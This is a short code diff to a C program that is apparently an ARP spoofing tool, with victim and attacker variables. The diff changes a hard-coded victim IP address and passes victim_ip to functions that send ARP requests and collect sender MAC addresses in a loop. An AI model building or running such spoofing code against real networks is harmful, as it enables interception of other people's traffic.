@@ -25,7 +25,7 @@ int main(int argc, char *argv[])
 	u_int8_t victim_ip[4];
 	u_int8_t gate_ip[4];
 	u_int8_t gate[4] = {10, 1, 1, 1};
-	u_int8_t victim[4] = {10, 1, 1, 156};
+	u_int8_t victim[4] = {192, 168, 123, 2};
 
 	char *dev = argv[1];
 	char *result;
@@ -48,8 +48,8 @@ int main(int argc, char *argv[])
 		victim[3] = i;
 		printf("sender ip addr : ");
 		print_ip(victim);
-		request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, victim, 0);
-		reply(dev, pcap, victim_mac, victim);
+		request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, victim_ip, 0);
+		reply(dev, pcap, victim_mac, victim_ip);
 		printf("sender mac addr : ");
 		print_mac(victim_mac);
 	}
